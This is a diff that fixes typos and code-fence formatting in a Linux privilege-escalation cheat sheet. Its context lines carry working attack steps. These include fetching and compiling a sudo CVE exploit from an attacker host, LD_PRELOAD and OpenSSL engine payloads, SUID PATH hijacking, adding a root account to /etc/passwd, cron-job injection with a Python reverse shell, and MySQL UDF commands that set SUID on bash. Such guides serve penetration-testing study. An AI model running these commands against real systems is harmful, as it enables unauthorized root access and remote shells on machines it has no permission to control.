@@ -1,5 +1,5 @@
 # Linux-Privilege-Escalation-Basics
-Simple and accurate guide for linux privilege escalation tactics 
+Simple and accurate guide for Linux privilege escalation tactics 
 
 # Privilege Escalation Methods
 
@@ -9,7 +9,7 @@ Simple and accurate guide for linux privilege escalation tactics
 - Credentials in tcpdump files
 - Writable Files
 - SSH Private Keys 
-- Kernel Expliots
+- Kernel Exploits
 - Sudo -l 
 - Sudo CVE 
 - Sudo LD_PRELOAD
@@ -143,20 +143,20 @@ find / -name id_rsa 2> /dev/null                       // Any SSH private keys?
    
 ```
 
-# Kernel Expliots
+# Kernel exploits
 
 
 ```
 uname -a // What OS kernel are we using?
 
-// Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
-// Read the expliots and follow the instructions
+// Google Search (Example): 4.4.0-116-generic #140-Ubuntu exploits OR 4.4.0-116-generic #140-Ubuntu PoC github
+// Read the exploits and follow the instructions
 // Popular Linux Kernel Exploits
 
 Dirty COW (CVE-2016-5195)
 URL: https://dirtycow.ninja/
 
-Other Kernel Expliots
+Other Kernel exploits
 URL: https://github.com/SecWiki/linux-kernel-exploits
 
 ```
@@ -199,7 +199,7 @@ User www-data may run the following commands on <hostname>
 - (root) NOPASSWD: /usr/bin/wget
 
 
-Absuing Sudo binaries to gain root
+Abusing sudo binaries to gain root
 ----------------------------------------------------
 find
 ```
@@ -369,7 +369,7 @@ id && whoami
 
 
 # Sudo CVE
-Expliot sudo with known CVE
+Exploit sudo with known CVE
 
 CVE:
 
@@ -396,9 +396,9 @@ sudo -V // Get sudo version
 
 sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled
 
-Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634
+Exploit PoC: https://github.com/saleemrashid/sudo-cve-2019-18634
 
-Download expliot.c
+Download exploit.c
 Upload to Victim 
 
 Attacker
@@ -409,10 +409,10 @@ python -m SimpleHTTPServer 9000 // You can use any port
 
 Victim
 
-```
-wget http://<attacker_ip>:9000/expliot.c
-Compile expliot.c: gcc expliot.c -o expliot
-./expliot
+```sh
+wget http://<attacker_ip>:9000/exploit.c
+Compile exploit.c: gcc exploit.c -o exploit
+./exploit
 id && whoami 
 ```
 
@@ -422,13 +422,12 @@ sudo -l
 
 Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?
 
-Expliot
-
-```
+Exploit
 
 cd /tmp
 vi priv.c
-   
+
+```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -456,14 +455,14 @@ GUID permission is similar to the SUID permission, only difference is – when t
 
 Enumeration:
 
-```
+```sh
 find / -perm -u=s -type f 2>/dev/null | xargs ls -l
 find / -perm -g=s -type f 2>/dev/null | xargs ls -l
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null 
 
 // Look for any binaries that seem odd. Any binaries running from a users home directory?
-// Check the version of any odd binaries and see if there are any public expliots that can be used to gain root
+// Check the version of any odd binaries and see if there are any public exploits that can be used to gain root
 
 
 ```
@@ -474,7 +473,7 @@ PATH is an environmental variable in Linux and Unix-like operating systems which
 
 View PATH
 
-```
+```sh
 echo $PATH
 env | grep PATH
 print $PATH
@@ -483,10 +482,11 @@ Example 1
 
 Create a Simple Basic SUID binary
 
-```
-cd /home/max/
-vi test.c
 
+cd /home/max/
+test.c:
+
+```c
 #include<unistd.h>
 void main()
 { setuid(0);
@@ -506,20 +506,21 @@ Example 1 (Without full bin path)
 
 Privilege Escalation
 
-```
-Find the SUID Binary
+```sh
+# Find the SUID Binary
 
 find / -perm -u=s -type f 2>/dev/null | xargs ls -l
 Output Example: /bin/tools/network-tester
 ls -la /bin/tools/network-tester
 
-Test the SUID Binary 
+# Test the SUID Binary 
 
 /bin/tools/network-tester
 strings /bin/tools/network-tester
-Output Example: curl -I 127.0.0.1 
 
-Absue the SUID Binary
+# Output Example: curl -I 127.0.0.1 
+
+# Absue the SUID Binary
 
 echo "/bin/bash" > /tmp/curl
 chmod 777 /tmp/curl
@@ -533,7 +534,7 @@ Example 3 (Without full bin path)
 
 Privilege Escalation
 
-```
+```sh
 Find the SUID Binary
 
 find / -perm -u=s -type f 2>/dev/null | xargs ls -l
@@ -605,7 +606,7 @@ Example 5 (Copy - /bin/cp)
 Privilege Escalation
 
 Victim
-```
+```sh
 find / -perm -u=s -type f 2>/dev/null | xargs ls -l
 Copy the contents of /etc/passwd to your local machine inside a new file called "passwd"
 ```
@@ -618,7 +619,7 @@ echo "root2:<output>:0:0:root:/root:/bin/bash" >> passwd // Replace <output> wit
 python -m SimpleHTTPServer 9000
 ```
 Victim
-```
+```sh
 wget -O /tmp/passwd http://10.10.10.10:9000/passwd
 cp /tmp/passwd /etc/passwd
 su root2
@@ -633,7 +634,7 @@ Cron jobs is a time-based job scheduler in Unix-like computer operating systems.
 
 Enumeration
 
-```
+```sh
 contab -l
 /etc/init.d
 /etc/cron*
@@ -650,12 +651,14 @@ Example 1
 
 Privilege Escalation via Nonexistent File Overwrite
 
-```
+```sh
 cat /etc/crontab
 Output Example: * * * * * root systemupdate.sh
 echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
 chmod +x /home/user/systemupdate.sh
-Wait a while
+
+# Wait a while
+
 /bin/bash -p
 id && whoami
 ```
@@ -664,7 +667,7 @@ Example 2
 
 Privilege Escalation via Root Executable Bash Script
 
-```
+```sh
 cat /etc/crontab
 Output Example: * * * * * root /usr/bin/local/network-test.sh
 echo "chmod +s /bin/bash" >> /usr/bin/local/network-test.sh
@@ -678,13 +681,16 @@ Privilege Escalation via Root Executable Python Script Overwrite
 
 Target
 
-```
+```sh
 cat /etc/crontab
 Output Example: * * * * * root /var/www/html/web-backup.py
 cd /var/www/html/
 vi web-backup.py
+```
+
 Add the below to the script:
 
+```python
 import socket
 import subprocess
 import os
@@ -710,7 +716,7 @@ OR
 
 Target
 
-```
+```sh
 cat /etc/crontab
 Output Example: * * * * * root /var/www/html/web-backup.py
 cd /var/www/html/
@@ -730,9 +736,9 @@ id && whoami
 
 Example 4
 
-Privilege Escalation via Tar Bash Script (WildCards)
+Privilege Escalation via Tar Bash Script (wildcards)
 
-```
+```sh
 cat /etc/crontab
 Output Example: * * * * * root /usr/bin/local/mysql-db-backup.sh
 cat /usr/bin/local/mysql-db-backup.sh
@@ -757,7 +763,7 @@ Example 5
 
 Privilege Escalation via Tar Cron Job
 
-```
+```sh
 cat /etc/crontab
 Output Example: */1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
 cd /var/www/html/
@@ -787,7 +793,7 @@ Capabilities can be set on processes and executable files. A process resulting f
 
 Python
 
-```
+```python
 getcap -r / 2>/dev/null         
 /usr/bin/python2.6 = cap_setuid+ep
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
@@ -803,7 +809,7 @@ id && whoami
 
 Perl
 
-```
+```perl
 getcap -r / 2>/dev/null         
 /usr/bin/perl = cap_setuid+ep
 /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
@@ -813,7 +819,7 @@ id && whoami
 Tar
 
 Method 1
-```
+```sh
 Victim
 
 getcap -r / 2>/dev/null         
@@ -835,7 +841,7 @@ id && whoami
 ```
 Method 2
 
-```
+```sh
 Victim
 
 getcap -r / 2>/dev/null         
@@ -856,7 +862,7 @@ id && whoami
 OpenSSL
 
 Victim
-```
+```sh
 getcap -r / 2>/dev/null         
 /usr/bin/openssl = cap_setuid+ep
 ```
@@ -864,7 +870,7 @@ getcap -r / 2>/dev/null
 Attacker
 Create a .so file - Code below
 vi priv.c
-```
+```c
 #include <openssl/engine.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -902,7 +908,7 @@ IMPLEMENT_DYNAMIC_CHECK_FN()
 
 Compile Code & Create .so file
 
-```
+```sh
 gcc -c fPIC priv.c -o priv
 gcc -shared -o priv.so -lcrypto priv
 ```
@@ -911,14 +917,14 @@ Victim
 
 Download .so from Attacker
 
-```
+```sh
 wget -O /tmp/priv.so http://10.10.10.10:9000/priv.so
 
 // Replace IP & Port
 ```
 Get Root
 
-```
+```sh
 openssl req -engine /tmp/priv.so
 /bin/bash -p
 id && whoami
@@ -936,7 +942,7 @@ Network File System (NFS): Network File System permits a user on a client machin
 
 - no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication.
 
-- async: It will speed up transfers but can cause data corruption as NFS server doesn’t wait for the complete write operation to be finished on the stable storage, before replying to the client.
+- async: It will speed up transfers but can cause data corruption as NFS server doesn't wait for the complete write operation to be finished on the stable storage, before replying to the client.
 
 - sync:   The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.
 
@@ -959,7 +965,7 @@ Privilege Escalation
 
 Attacker
 
-```
+```sh
 
 showmount -e <victim_ip>                      
 mkdir /tmp/mount                                
@@ -977,7 +983,7 @@ cd /tmp/mount
 cp /bin/bash .
 chmod +s bash
 ```
-```
+```sh
 Victim
 
 cd /tmp
@@ -993,8 +999,8 @@ id && whoami
 
 # chkrootkit 0.49
 
-```
-Expliot: https://www.exploit-db.com/exploits/33899
+```sh
+Exploit: https://www.exploit-db.com/exploits/33899
 
 cat /etc/cron.daily
 
@@ -1020,7 +1026,7 @@ Tmux Cheat Sheet: https://tmuxcheatsheet.com/
 
 Privilege Escalation
 
-```
+```sh
 tmux list-sessions                        // Any Tmux sessions running as root?
 /tmp/tmux-14/default-root                 // Root Tmux Session
 tmux -S /tmp/tmux-14/default-root         // Replace Path to Socket (Depending on your results)
@@ -1035,7 +1041,7 @@ tmux -S /opt/.dev/gbm/ attach -t 0        // Replace Path to Session (Depending 
 # MySQL Running as root
 
 Example 1
-```
+```sh
 ps aux | grep root
 
 mysql -u root -p
@@ -1050,7 +1056,7 @@ id && whoami
 Example 2
 
 Victim
-```
+```sh
 ps aux | grep root
 
 mysql -u root -p
@@ -1059,7 +1065,7 @@ mysql -u root -p
 ```
 Attacker
 
-```
+```sh
 nc -lvnp 9999
 id && whoami
 ```
@@ -1076,7 +1082,7 @@ Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/mas
 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32
 
 Victim
-```
+```sh
 ps aux | grep root                        //  Verify that MySQL is running as root
 Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
 mysql -u root -p
@@ -1105,11 +1111,13 @@ Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/mas
 
 Victim
 
-```
+```sh
 ps aux | grep root                        //  Verify that MySQL is running as root
 Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
 mysql -u root -p
+```
 
+```sql
 mysql> use mysql;
 mysql> create table admin(line blob);
 mysql> insert into admin values(load_file('/tmp/lib_mysqludf_sys.so'));
@@ -1118,28 +1126,36 @@ mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
 mysql> select sys_exec('chmod +s /bin/bash');
 mysql> exit
 Wait a while
+```
+
+```sh
 ls -la /bin/bash                         // Verify that the SUID bit is set 
 /bin/bash -p
 id && whoami
 ```
-Example 3 (Explioting MySQL 4.x/5.0 (Linux))
+Example 3 (Exploiting MySQL 4.x/5.0 (Linux))
 
 UDF Link: https://www.exploit-db.com/exploits/1518
 
 Victim
-```
+```sh
 wget -O priv.c https://www.exploit-db.com/download/1518
 gcc –g –shared –Wl,–soname,priv.so –o priv.so priv.c –lc
 chmod 777 priv.so
 mv priv.so /tmp/
 mysql -u root -p 
+```
 
+```mysql
 mysql> create table priv(line blob);
 mysql> insert into priv values(load_file(‘/tmp/priv.so’));
 mysql> select * from priv into dumpfile ‘/usr/lib/mysql/plugin/priv.so’;
 mysql> create function do_system returns integer soname ‘priv.so’;
 mysql> select do_system(‘chmod +s /bin/bash’);
 mysql>!sh
+```
+
+```sh
 /bin/bash -p
 id && whoami
 
